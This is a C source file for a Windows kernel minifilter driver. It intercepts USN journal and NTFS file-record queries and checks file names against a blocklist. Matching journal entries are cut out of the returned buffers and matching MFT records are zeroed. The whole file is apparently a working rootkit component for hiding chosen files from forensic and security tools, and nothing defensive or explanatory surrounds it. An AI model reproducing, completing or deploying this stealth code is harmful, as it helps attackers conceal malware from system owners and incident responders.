#include "Journal.h"
#include "Blocklist.h"


static BOOLEAN MftRecordContainsTarget(PUCHAR fileRecord, ULONG recordLen) {
    if (recordLen < 48 || fileRecord[0] != 'F' || fileRecord[1] != 'I' ||
        fileRecord[2] != 'L' || fileRecord[3] != 'E') return FALSE;

    USHORT firstAttrOffset = *(PUSHORT)(fileRecord + 20);
    if (firstAttrOffset < 24 || firstAttrOffset >= recordLen) return FALSE;

    PUCHAR attr = fileRecord + firstAttrOffset;
    while (attr + 16 <= fileRecord + recordLen) {
        ULONG attrType = *(PULONG)attr;
        ULONG attrLen = *(PULONG)(attr + 4);

        if (attrType == 0xFFFFFFFF || attrLen == 0) break;
        if (attrLen < 16 || (ULONG)(attr + attrLen - fileRecord) > recordLen) break;

        if (attrType == 0x30) { // FILE NAME
            UCHAR nonResident = *(attr + 8);
            if (nonResident == 0) {
                ULONG valLen = *(PULONG)(attr + 16);
                USHORT valOffset = *(PUSHORT)(attr + 20);

                if (valOffset >= 24 && valLen >= 66 && (ULONG)(valOffset + valLen) <= attrLen) {
                    PUCHAR val = attr + valOffset;
                    UCHAR fnLen = *(val + 64);
                    if (fnLen > 0 && fnLen <= 255 && (ULONG)(66 + fnLen * 2) <= valLen) {
                        UNICODE_STRING uName;
                        uName.Buffer = (PWCH)(val + 66);
                        uName.Length = fnLen * sizeof(WCHAR);
                        uName.MaximumLength = uName.Length;
                        if (ShouldFilterName(&uName)) return TRUE;
                    }
                }
            }
        }
        attr += attrLen;
    }
    return FALSE;
}

FLT_PREOP_CALLBACK_STATUS JournalPreFsctl(
    PFLT_CALLBACK_DATA Data,
    PCFLT_RELATED_OBJECTS FltObjects,
    PVOID* CompletionContext)
{
    UNREFERENCED_PARAMETER(FltObjects);
    UNREFERENCED_PARAMETER(CompletionContext);
    ULONG fsctl = Data->Iopb->Parameters.FileSystemControl.Neither.FsControlCode;
    if (fsctl == FSCTL_READ_USN_JOURNAL ||
        fsctl == FSCTL_QUERY_USN_JOURNAL ||
        fsctl == FSCTL_ENUM_USN_DATA ||
        fsctl == FSCTL_GET_NTFS_FILE_RECORD)
        return FLT_PREOP_SUCCESS_WITH_CALLBACK;
    return FLT_PREOP_SUCCESS_NO_CALLBACK;
}

FLT_POSTOP_CALLBACK_STATUS JournalPostFsctl(
    PFLT_CALLBACK_DATA Data,
    PCFLT_RELATED_OBJECTS FltObjects,
    PVOID CompletionContext,
    FLT_POST_OPERATION_FLAGS Flags)
{
    UNREFERENCED_PARAMETER(FltObjects);
    UNREFERENCED_PARAMETER(CompletionContext);
    UNREFERENCED_PARAMETER(Flags);

    if (!NT_SUCCESS(Data->IoStatus.Status) || Data->IoStatus.Information == 0)
        return FLT_POSTOP_FINISHED_PROCESSING;

    ULONG fsctl = Data->Iopb->Parameters.FileSystemControl.Neither.FsControlCode;
    if (fsctl != FSCTL_READ_USN_JOURNAL && fsctl != FSCTL_ENUM_USN_DATA && fsctl != FSCTL_GET_NTFS_FILE_RECORD)
        return FLT_POSTOP_FINISHED_PROCESSING;

    PVOID buffer = NULL;
    PMDL pMdl = Data->Iopb->Parameters.FileSystemControl.Neither.OutputMdlAddress;
    if (pMdl)
        buffer = MmGetSystemAddressForMdlSafe(pMdl, NormalPagePriority);
    else
        buffer = Data->Iopb->Parameters.FileSystemControl.Neither.OutputBuffer;

    if (!buffer) return FLT_POSTOP_FINISHED_PROCESSING;

    __try {
        if (fsctl == FSCTL_READ_USN_JOURNAL || fsctl == FSCTL_ENUM_USN_DATA) {
            PUCHAR pRecord  = (PUCHAR)buffer;
            ULONG remaining = (ULONG)Data->IoStatus.Information;

            if (remaining >= 8) { pRecord += 8; remaining -= 8; }

            while (remaining >= 12) {
                ULONG recordLength = *(PULONG)pRecord;
                if (recordLength == 0 || recordLength > remaining || (recordLength % 8) != 0) break;

                USHORT majorVersion = *(PUSHORT)(pRecord + 4);
                USHORT nameOffset = 0, nameLength = 0;

                if (majorVersion == 2 && recordLength >= 60) {
                    nameOffset = *(PUSHORT)(pRecord + 56);
                    nameLength = *(PUSHORT)(pRecord + 58);
                } else if (majorVersion == 3 && recordLength >= 80) {
                    nameLength = *(PUSHORT)(pRecord + 58);
                    nameOffset = *(PUSHORT)(pRecord + 60);
                }

                if (nameOffset > 0 && nameLength > 0 &&
                    (ULONG)(nameOffset + nameLength) <= recordLength)
                {
                    UNICODE_STRING uName;
                    uName.Buffer = (PWCH)(pRecord + nameOffset);
                    uName.Length = nameLength;
                    uName.MaximumLength = nameLength;

                    if (ShouldFilterName(&uName)) {
                        ULONG tail = remaining - recordLength;
                        if (tail > 0)
                            RtlMoveMemory(pRecord, pRecord + recordLength, tail);
                        Data->IoStatus.Information -= recordLength;
                        remaining -= recordLength;
                        continue;
                    }
                }
                pRecord   += recordLength;
                remaining -= recordLength;
            }
        } 
        else if (fsctl == FSCTL_GET_NTFS_FILE_RECORD) {
            ULONG outLen = (ULONG)Data->IoStatus.Information;
            if (outLen >= 12) {
                ULONG mftRecordLen = *(PULONG)((PUCHAR)buffer + 8);
                PUCHAR mftRecord = (PUCHAR)buffer + 12;

                if (mftRecordLen > 0 && 12 + mftRecordLen <= outLen) {
                    if (MftRecordContainsTarget(mftRecord, mftRecordLen)) {
                        
                        RtlZeroMemory(mftRecord, mftRecordLen);
                    }
                }
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {}

    return FLT_POSTOP_FINISHED_PROCESSING;
}
